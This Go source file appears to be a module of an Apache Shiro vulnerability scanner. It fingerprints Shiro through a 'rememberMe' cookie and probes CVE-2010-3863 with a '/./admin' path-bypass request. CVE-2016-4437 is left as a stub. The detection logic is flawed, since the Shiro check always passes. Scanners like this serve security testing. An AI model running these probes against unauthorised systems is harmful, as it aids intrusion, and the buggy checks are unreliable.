package Framework

import (
	"errors"
	"fmt"
	"github.com/imroc/req/v3"
	"net/http"
	"strings"
	"time"
)

type Shiro struct {
	url       string
	proxyUrl  string
	userAgent string
	timeOut   time.Duration
	headers   map[string]string
	threads   int
}

func (shiro *Shiro) SetUrl(url string) *Shiro {
	shiro.url = url
	return shiro
}

func (shiro *Shiro) SetProxyUrl(proxyUrl string) *Shiro {
	shiro.proxyUrl = proxyUrl
	return shiro
}

func (shiro *Shiro) SetUserAgent(userAgent string) *Shiro {
	shiro.userAgent = userAgent
	return shiro
}

func (shiro *Shiro) SetTimeout(timeout time.Duration) *Shiro {
	shiro.timeOut = timeout
	return shiro
}

func (shiro *Shiro) SetHeaders(headers map[string]string) *Shiro {
	shiro.headers = headers
	return shiro
}

func (shiro *Shiro) setThreads(threads int) *Shiro {
	shiro.threads = threads
	return shiro
}

func (shiro *Shiro) checkParameters() {
	if shiro.threads <= 0 {
		shiro.threads = 1
	}

	if shiro.userAgent == "" {
		shiro.userAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"
	}
}

func (shiro *Shiro) checkIsShiro() bool {
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	r, err := http.NewRequest("GET", shiro.url, nil)
	r.Header.Set("Cookie", "rememberMe=yes")
	r.Header.Set("User-Agent", shiro.userAgent)
	if err != nil {
		fmt.Println(err)
		return false
	}
	resp, err := client.Do(r)
	if err != nil {
		fmt.Println(err)
		return false
	}
	defer resp.Body.Close()
	if strings.Contains(resp.Header.Get("Set-Cookie"), "") {
		return true
	} else {
		return false
	}
}

func (shiro *Shiro) CVE_2010_3863() (string, error) {
	shiro.checkParameters()
	if !shiro.checkIsShiro() {
		return "", errors.New("[-] 未检测到shiro框架")
	} else {
		fmt.Println("[+] 检测到shiro框架")
	}

	var resp *req.Response
	var err error
	if len(shiro.headers) != 0 {
		resp, err = req.C().SetProxyURL(shiro.proxyUrl).SetUserAgent(shiro.userAgent).SetTimeout(shiro.timeOut).R().SetHeaders(shiro.headers).Get(fmt.Sprintf("%s/./admin", shiro.url))
	} else {
		resp, err = req.C().SetProxyURL(shiro.proxyUrl).SetUserAgent(shiro.userAgent).SetTimeout(shiro.timeOut).R().SetHeaders(shiro.headers).Get(fmt.Sprintf("%s/./admin", shiro.url))
	}
	if err != nil {
		return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "CVE_2010_3863检测失败", shiro.url, err.Error()))
	}

	if strings.Contains(resp.String(), "successfully") {
		return fmt.Sprintf("[+] %s -> %s/./admin\n", "CVE_2010_3863存在漏洞", shiro.url), nil
	} else {
		return fmt.Sprintf("[-] %s -> %s/./admin\n", "CVE_2010_3863不存在漏洞", shiro.url), nil
	}
}

func (shiro *Shiro) CVE_2016_4437() (string, error) {
	shiro.checkParameters()
	if !shiro.checkIsShiro() {
		return "", errors.New("[-] 未检测到shiro框架")
	} else {
		fmt.Println("[+] 检测到shiro框架")
	}

	return "未开发漏洞", nil
}
